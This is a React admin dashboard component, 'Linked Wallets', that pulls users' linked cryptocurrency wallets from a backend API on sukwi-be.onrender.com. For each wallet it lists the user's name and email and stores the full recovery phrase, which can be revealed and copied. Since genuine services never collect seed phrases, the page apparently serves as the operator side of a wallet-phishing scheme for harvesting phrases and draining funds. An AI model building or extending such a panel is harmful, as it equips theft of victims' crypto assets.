import React, { useState, useEffect } from "react";
import {
  Copy,
  Check,
  Eye,
  EyeOff,
  Wallet,
  Loader2,
  AlertCircle,
} from "lucide-react";

// Notification Component
const Notification = ({ type, message, onClose }) => {
  const bgColor = {
    success: "bg-green-50 border-green-200 text-green-800",
    error: "bg-red-50 border-red-200 text-red-800",
    info: "bg-blue-50 border-blue-200 text-blue-800",
  };

  const icon = {
    success: <Check className="h-5 w-5 text-green-600" />,
    error: <AlertCircle className="h-5 w-5 text-red-600" />,
    info: <AlertCircle className="h-5 w-5 text-blue-600" />,
  };

  return (
    <div
      className={`fixed top-4 right-4 z-50 ${bgColor[type]} border rounded-lg shadow-lg p-4 max-w-md transition-transform duration-300`}
    >
      <div className="flex items-start">
        <div className="flex-shrink-0">{icon[type]}</div>
        <div className="ml-3 flex-1">
          <p className="text-sm font-medium">{message}</p>
        </div>
        <button
          onClick={onClose}
          className="ml-4 flex-shrink-0 text-gray-400 hover:text-gray-600"
        >
          <AlertCircle className="h-4 w-4" />
        </button>
      </div>
    </div>
  );
};

// Get token from localStorage
const getAuthToken = () => {
  return localStorage.getItem("token") || sessionStorage.getItem("token");
};

// Linked Wallets Component
const LinkedWallets = () => {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [notification, setNotification] = useState(null);
  const [visiblePhrases, setVisiblePhrases] = useState({});
  const [copiedId, setCopiedId] = useState(null);

  // Fetch linked wallets - GET request
  const fetchWallets = async () => {
    try {
      setLoading(true);
      setError(null);

      const token = getAuthToken();

      if (!token) {
        throw new Error("No authentication token found. Please login again.");
      }

      const response = await fetch(
        "https://sukwi-be.onrender.com/api/admin/wallets/linked",
        {
          method: "GET",
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
        },
      );

      if (response.status === 401) {
        showNotification("error", "Session expired. Please login again.");
        return;
      }

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        setWallets(data.data.linkedWallets);
      } else {
        setError(data.message || "Failed to fetch wallets");
      }
    } catch (err) {
      setError(err.message);
      showNotification("error", err.message || "Failed to fetch wallets");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchWallets();
  }, []);

  // Show notification
  const showNotification = (type, message) => {
    setNotification({ type, message });
    setTimeout(() => setNotification(null), 3000);
  };

  // Toggle phrase visibility
  const togglePhraseVisibility = (id) => {
    setVisiblePhrases((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  // Copy phrase to clipboard
  const copyPhrase = async (id, phrase) => {
    try {
      await navigator.clipboard.writeText(phrase);
      setCopiedId(id);
      showNotification("success", "Recovery phrase copied to clipboard");

      // Reset copied state after 2 seconds
      setTimeout(() => {
        setCopiedId(null);
      }, 2000);
    } catch (err) {
      showNotification("error", "Failed to copy to clipboard");
    }
  };

  // Format date
  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleDateString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
    });
  };

  // Mask phrase
  const maskPhrase = (phrase) => {
    const words = phrase.split(" ");
    return words.map((word) => "•".repeat(word.length)).join(" ");
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin text-blue-600 mx-auto mb-4" />
          <p className="text-gray-600">Loading ...</p>
        </div>
      </div>
    );
  }

  //   if (error) {
  //     return (
  //       <div className="bg-red-50 border border-red-200 rounded-lg p-6 text-center">
  //         <AlertCircle className="h-12 w-12 text-red-400 mx-auto mb-4" />
  //         <h3 className="text-lg font-medium text-red-800 mb-2">
  //           Failed to load wallets
  //         </h3>
  //         <p className="text-red-600 mb-4">{error}</p>
  //         <button
  //           onClick={fetchWallets}
  //           className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
  //         >
  //           Try Again
  //         </button>
  //       </div>
  //     );
  //   }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Linked Wallets</h1>
          <p className="text-gray-600 mt-1">
            View all user-linked cryptocurrency wallets
          </p>
        </div>
        <div className="flex items-center space-x-3">
          <div className="text-sm text-gray-500">
            <span className="font-semibold text-gray-900">
              {wallets.length}
            </span>{" "}
            linked wallets
          </div>
          <button
            onClick={fetchWallets}
            disabled={loading}
            className="flex items-center px-4 py-2 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <Loader2
              className={`h-4 w-4 mr-2 ${loading ? "animate-spin" : ""}`}
            />
            Refresh
          </button>
        </div>
      </div>

      {/* Table */}
      <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Wallet Name
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  User
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Recovery Phrase
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Status
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Linked Date
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {wallets.length === 0 ? (
                <tr>
                  <td colSpan="5" className="px-6 py-12 text-center">
                    <div className="text-gray-400">
                      <Wallet className="h-12 w-12 mx-auto mb-4 opacity-50" />
                      <p className="text-lg font-medium text-gray-900 mb-1">
                        No linked wallets
                      </p>
                      <p className="text-gray-500">
                        No wallets have been linked yet
                      </p>
                    </div>
                  </td>
                </tr>
              ) : (
                wallets.map((wallet) => {
                  const isPhraseVisible = visiblePhrases[wallet.id];
                  const isCopied = copiedId === wallet.id;

                  return (
                    <tr key={wallet.id} className="hover:bg-gray-50">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center">
                          <div className="w-8 h-8 bg-blue-100 rounded-lg flex items-center justify-center mr-3">
                            <Wallet className="h-4 w-4 text-blue-600" />
                          </div>
                          <div>
                            <p className="text-sm font-medium text-gray-900">
                              {wallet.walletName}
                            </p>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div>
                          <p className="text-sm font-medium text-gray-900">
                            {wallet.user.name}
                          </p>
                          <p className="text-sm text-gray-500 truncate max-w-[180px]">
                            {wallet.user.email}
                          </p>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center space-x-2">
                          <div className="flex-1 min-w-0">
                            <div className="bg-gray-50 rounded-lg px-3 py-2 font-mono text-sm">
                              {isPhraseVisible ? (
                                <span className="text-gray-900">
                                  {wallet.phrase}
                                </span>
                              ) : (
                                <span className="text-gray-500">
                                  {maskPhrase(wallet.phrase)}
                                </span>
                              )}
                            </div>
                          </div>
                          <div className="flex items-center space-x-1">
                            <button
                              onClick={() => togglePhraseVisibility(wallet.id)}
                              className="p-2 text-gray-400 hover:text-gray-600"
                              title={
                                isPhraseVisible ? "Hide phrase" : "Show phrase"
                              }
                            >
                              {isPhraseVisible ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </button>
                            <button
                              onClick={() =>
                                copyPhrase(wallet.id, wallet.phrase)
                              }
                              className={`p-2 rounded transition-colors ${
                                isCopied
                                  ? "bg-green-100 text-green-600"
                                  : "text-gray-400 hover:text-gray-600 hover:bg-gray-100"
                              }`}
                              title={isCopied ? "Copied!" : "Copy phrase"}
                            >
                              {isCopied ? (
                                <Check className="h-4 w-4" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </button>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span
                          className={`inline-flex items-center px-3 py-1 rounded-full text-xs font-medium ${
                            wallet.isActive
                              ? "bg-green-100 text-green-800"
                              : "bg-gray-100 text-gray-800"
                          }`}
                        >
                          {wallet.isActive ? "Active" : "Inactive"}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="text-sm text-gray-500">
                          {formatDate(wallet.linkedAt)}
                        </span>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Notification */}
      {notification && (
        <Notification
          type={notification.type}
          message={notification.message}
          onClose={() => setNotification(null)}
        />
      )}
    </div>
  );
};

export default LinkedWallets;
